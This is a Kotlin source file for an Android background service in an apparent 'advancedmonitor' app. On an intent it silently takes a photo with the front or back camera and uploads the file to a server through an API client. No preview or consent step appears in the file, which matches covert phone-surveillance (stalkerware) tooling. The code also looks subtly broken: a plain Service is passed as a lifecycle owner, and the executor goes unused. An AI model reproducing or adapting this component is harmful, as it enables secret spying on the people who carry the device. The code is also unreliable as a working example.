package com.example.advancedmonitor.services

import android.app.Service
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.IBinder
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.example.advancedmonitor.utils.ApiClient
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class CameraService : Service() {

    private lateinit var cameraExecutor: ExecutorService
    private var imageCapture: ImageCapture? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val cameraType = intent?.getStringExtra("camera_type") ?: "back"
        capturePhoto(cameraType)
        return START_NOT_STICKY
    }

    private fun capturePhoto(cameraType: String) {
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val lensFacing = when (cameraType) {
                    "front" -> CameraSelector.LENS_FACING_FRONT
                    else -> CameraSelector.LENS_FACING_BACK
                }
                
                val cameraSelector = CameraSelector.Builder()
                    .requireLensFacing(lensFacing)
                    .build()
                
                imageCapture = ImageCapture.Builder().build()
                
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    this, 
                    cameraSelector, 
                    imageCapture
                )
                
                takePhoto()
            } catch (e: Exception) {
                Log.e("CameraService", "Camera setup failed: ${e.message}")
                stopSelf()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun takePhoto() {
        val photoFile = createTempFile("photo", ".jpg")
        
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()
        
        imageCapture?.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(this),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    ApiClient.uploadFile(applicationContext, photoFile, "photo")
                    stopSelf()
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e("CameraService", "Photo capture failed: ${exception.message}")
                    stopSelf()
                }
            }
        )
    }

    private fun createTempFile(prefix: String, suffix: String): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        return File(cacheDir, "${prefix}_$timeStamp$suffix")
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraExecutor.shutdown()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
